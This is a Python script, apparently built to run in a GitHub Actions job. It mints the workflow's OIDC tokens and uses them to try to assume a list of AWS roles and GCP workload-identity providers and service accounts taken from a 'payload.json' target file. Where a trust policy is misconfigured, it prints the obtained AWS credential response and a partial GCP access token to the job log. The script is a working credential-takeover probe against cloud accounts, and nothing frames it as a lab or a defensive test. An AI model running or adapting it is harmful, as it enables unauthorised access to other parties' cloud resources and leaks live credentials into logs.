import os, json, base64, urllib.parse, urllib.request, urllib.error, sys

def oidc(aud):
    base=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; rt=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
    u=base+('&' if '?' in base else '?')+urllib.parse.urlencode({'audience':aud})
    r=urllib.request.Request(u,headers={'Authorization':'Bearer '+rt,'Accept':'application/json'})
    with urllib.request.urlopen(r,timeout=30) as f:
        return json.load(f)['value']

def jwt_claims(t):
    p=t.split('.')[1]; p+='='*((4-len(p)%4)%4)
    return json.loads(base64.urlsafe_b64decode(p))

def post(url, data=None, headers=None, raw=None):
    h=dict(headers or {})
    body = raw if raw is not None else urllib.parse.urlencode(data or {}).encode()
    req=urllib.request.Request(url,data=body,headers=h,method='POST')
    try:
        with urllib.request.urlopen(req,timeout=45) as f:
            return f.status, f.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace')
    except Exception as e:
        return 0, str(e)[:300]

P=json.load(open('payload.json'))
print('PAYLOAD_ITEMS', len(P.get('targets',[])), flush=True)

# always show our identity
try:
    t0=oidc('sts.amazonaws.com')
    c=jwt_claims(t0)
    print('SELF_SUB', c.get('sub'), flush=True)
    print('SELF_AUD', c.get('aud'), flush=True)
    print('SELF_ISS', c.get('iss'), flush=True)
    print('SELF_REPO', c.get('repository'), 'REF', c.get('ref'), flush=True)
except Exception as e:
    print('SELF_MINT_FAIL', str(e)[:300], flush=True)

for it in P.get('targets',[]):
    kind=it.get('kind'); label=it.get('label') or it.get('role_arn') or it.get('provider_audience')
    try:
        if kind=='aws_role':
            arn=it['role_arn']
            tok=oidc(it.get('audience','sts.amazonaws.com'))
            st,body=post('https://sts.amazonaws.com/', {
                'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15',
                'RoleArn':arn,'RoleSessionName':it.get('session','c211-i98180'),
                'WebIdentityToken':tok,
                'DurationSeconds':str(it.get('duration',3600))})
            ok = (st==200 and '<Credentials>' in body)
            print('AWS', 'OK' if ok else 'NO', st, label, flush=True)
            if ok:
                import re
                ak=re.search(r'<AccessKeyId>([^<]+)</AccessKeyId>',body)
                print('AWSOK_AK', ak.group(1) if ak else '', flush=True)
                print('AWSOK_BODY', body[:1200].replace('\n',' '), flush=True)
            else:
                print('AWSERR', body[:400].replace('\n',' '), flush=True)
        elif kind=='gcp_wif':
            aud=it['provider_audience']
            tok=oidc(aud)
            st,body=post('https://sts.googleapis.com/v1/token', raw=json.dumps({
                'audience':aud,'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
                'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
                'scope':'https://www.googleapis.com/auth/cloud-platform',
                'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt',
                'subjectToken':tok}).encode(),
                headers={'Content-Type':'application/json'})
            print('GCP', 'OK' if st==200 else 'NO', st, label, flush=True)
            if st==200:
                j=json.loads(body); at=j.get('access_token','')
                print('GCPOK_AT_PREFIX', at[:12], 'LEN', len(at), flush=True)
                for sae in it.get('service_accounts',[]):
                    st2,b2=post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%urllib.parse.quote(sae,safe='@'),
                        raw=json.dumps({'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'}).encode(),
                        headers={'Content-Type':'application/json','Authorization':'Bearer '+at})
                    print('GCP_SA', st2, sae, b2[:200].replace('\n',' '), flush=True)
            else:
                print('GCPERR', body[:400].replace('\n',' '), flush=True)
    except Exception as e:
        print('TARGET_EXC', kind, label, str(e)[:200], flush=True)
print('DONE', flush=True)
